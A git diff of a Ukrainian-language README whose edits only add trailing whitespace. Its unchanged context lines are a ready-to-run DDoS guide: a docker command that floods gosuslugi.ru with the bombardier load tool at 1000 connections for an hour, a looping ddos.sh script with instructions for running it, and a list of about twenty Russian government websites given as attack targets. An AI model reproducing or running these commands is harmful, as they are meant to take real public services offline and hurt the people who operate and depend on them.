@@ -22,7 +22,7 @@ docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.
 ```
 (замініть `https://www.gosuslugi.ru` на необхідний сайт)  
 **Ви можете відкрити декілька вікон терміналу**  
-5. ДОДАТКОВО
+5. ДОДАТКОВО  
 Можете створити файл `ddos.sh` та контентом:
 ```
 #!/bin/bash -x
@@ -36,7 +36,7 @@ do
    done
 done
 ```
-та запустити з допомогою команди `chmod +x ddos.sh && sh ddos.sh` в терміналі
+та запустити з допомогою команди `chmod +x ddos.sh && sh ddos.sh` в терміналі  
 
 ## Ресурси для атаки (краще слідкувати за апдейтами в Telegram)
 `http://duma.gov.ru/` `http://president-sovet.ru/` `https://sovetnational.ru/` `https://www.gosuslugi.ru/ru/` `https://zakupki.gov.ru/epz/main/public/home.html` `https://gossluzhba.gov.ru/` `http://defence.council.gov.ru/` `http://budget.council.gov.ru/` `http://www.kremlin.ru/` `https://government.ru/` `http://www.scrf.gov.ru/` `http://www.ksrf.ru/ru/Pages/default.aspx` `http://www.vsrf.ru/` `http://premier.gov.ru/events/` `https://www.mchs.gov.ru/` `https://minjust.gov.ru/ru/` `http://www.fsb.ru/` `https://rosguard.gov.ru/` `https://customs.gov.ru/` `https://udprf.ru/` `http://favt.gov.ru/`
